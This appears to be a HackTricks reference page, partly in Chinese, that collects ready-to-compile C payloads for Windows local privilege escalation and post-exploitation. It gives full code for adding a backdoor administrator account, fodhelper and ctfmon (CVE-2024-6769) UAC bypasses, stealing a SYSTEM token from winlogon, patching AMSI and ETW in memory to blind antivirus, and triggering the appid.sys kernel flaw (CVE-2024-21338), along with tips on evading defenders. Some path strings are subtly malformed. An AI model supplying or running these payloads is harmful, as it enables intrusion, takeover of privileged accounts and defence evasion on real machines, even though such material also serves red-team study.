# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

本页收集了 **小型、独立的 C 代码片段**，在 Windows Local Privilege Escalation 或 post-exploitation 期间非常有用。每个 payload 设计为 **便于复制粘贴**，仅依赖 Windows API / C runtime，并可使用 `i686-w64-mingw32-gcc`（x86）或 `x86_64-w64-mingw32-gcc`（x64）进行编译。

> ⚠️  这些 payload 假定进程已经具备执行该操作所需的最小权限（例如 `SeDebugPrivilege`、`SeImpersonatePrivilege`，或用于 UAC bypass 的 medium-integrity context）。它们用于 **red-team 或 CTF 场景**，在这些场景中利用漏洞已获得任意本机代码执行。

---

## 添加本地管理员用户
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
当受信任的二进制文件 **`fodhelper.exe`** 被执行时，它会查询下面的注册表路径，**不会过滤 `DelegateExecute` 动作**。通过在该键下植入我们的命令，攻击者可以在*不*将文件写入磁盘的情况下绕过 UAC。

*`fodhelper.exe` 查询的注册表路径*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
一个最小的 PoC，会弹出提升权限的 `cmd.exe`：
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*在 Windows 10 22H2 和 Windows 11 23H2（2025年7月补丁）上测试。该绕过仍然有效，因为 Microsoft 尚未修复 `DelegateExecute` 路径中缺失的完整性检查。*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning 仍然对已修补的 Windows 10/11 有效，因为 `ctfmon.exe` 以高完整性受信任的 UI 进程运行，会从调用方模拟的 `C:` 驱动器加载，并重用 `CSRSS` 已缓存的任何 DLL 重定向。滥用流程如下：将 `C:` 指向攻击者可控的存储，放置被植入的 `msctf.dll`，启动 `ctfmon.exe` 以获取高完整性，然后让 `CSRSS` 缓存一个将某个自动提升二进制（例如 `fodhelper.exe`）使用的 DLL 重定向到你 payload 的 manifest，这样下次启动就会继承你的 payload 而不会弹出 UAC 提示。

Practical workflow:
1. 准备一个伪造的 `%SystemRoot%\System32` 目录树，并复制你计划劫持的真实二进制（通常是 `ctfmon.exe`）。
2. 在你的进程中使用 `DefineDosDevice(DDD_RAW_TARGET_PATH)` 重新映射 `C:`，并保留 `DDD_NO_BROADCAST_SYSTEM` 以使更改仅在本地生效。
3. 将你的 DLL + manifest 放入伪造目录，调用 `CreateActCtx/ActivateActCtx` 将 manifest 推入 activation-context 缓存，然后启动自动提升的二进制，使其将被重定向的 DLL 解析为你的 shellcode。
4. 完成后删除缓存条目（`sxstrace ClearCache`）或重启以清除攻击者痕迹。

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

清理提示：在 popping SYSTEM 之后，在测试时调用 `sxstrace Trace -logfile %TEMP%\sxstrace.etl`，随后运行 `sxstrace Parse` —— 如果你在日志中看到你的 manifest 名称，防御者也能看到，所以每次运行都要更换路径。

---

## 通过令牌复制生成 SYSTEM shell (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
如果当前进程同时拥有 **`SeDebug`** 和 **`SeImpersonate`** 权限（许多服务帐户的典型情况），你可以从 `winlogon.exe` 窃取令牌，复制它，并启动一个提权进程：
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
有关其工作原理的更深入解释，请参见：

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## 内存中 AMSI & ETW 修补 (Defence Evasion)
Most modern AV/EDR engines rely on **AMSI** and **ETW** to inspect malicious behaviours. 在当前进程内尽早修补这两个接口可以防止基于脚本的 payloads（例如 PowerShell、JScript）被扫描。
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*上面的补丁是进程本地的；在运行后生成新的 PowerShell 将在没有 AMSI/ETW 检查的情况下执行。*

---

## Create child as Protected Process Light (PPL)
在创建时为子进程请求 PPL 保护级别，使用 `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`。这是一个有文档记录的 API，并且只有当目标映像为所请求的签名者类别签名（Windows/WindowsLight/Antimalware/LSA/WinTcb）时才会成功。
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
最常用的级别：
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

使用 Process Explorer/Process Hacker 验证结果，检查 Protection 列。

---

## Local Service -> Kernel 通过 `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` 暴露了一个设备对象（`\\.\\AppID`），其 smart-hash 维护 IOCTL 在调用者以 `LOCAL SERVICE` 身份运行时接受用户提供的函数指针；Lazarus 利用该点来禁用 PPL 并加载任意驱动，因此 red teams 应准备一个现成的触发器用于实验室使用。

操作注意事项：
- 你仍然需要一个 `LOCAL SERVICE` token。使用 `SeImpersonatePrivilege` 从 `Schedule` 或 `WdiServiceHost` 窃取它，然后在操作设备之前进行模拟，以使 ACL 检查通过。
- IOCTL `0x22A018` 期望一个包含两个回调指针（查询长度 + 读取函数）的结构。将两者都指向用户模式的存根，这些存根构造一个 token overwrite 或 映射 ring-0 原语，但要保持缓冲区为 RWX，以免 KernelPatchGuard 在链中途崩溃。
- 成功后，退出模拟并还原设备句柄；检测方现在会查找意外的 `Device\\AppID` 句柄，因此在获得权限后应立即关闭它。

<details>
<summary>C - 针对 `appid.sys` smart-hash 滥用的 C 语言骨架触发器</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

用于武器化构建的最小修补：映射一个 RWX 节（使用 `VirtualAlloc`），将你的 token duplication stub 复制到那里，设置 KernelThunk = section，并且一旦 `DeviceIoControl` 返回，你即使在 PPL 下也应该成为 SYSTEM。

---

## 参考资料
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – 最小的 PPL 进程启动器: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft 文档 – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
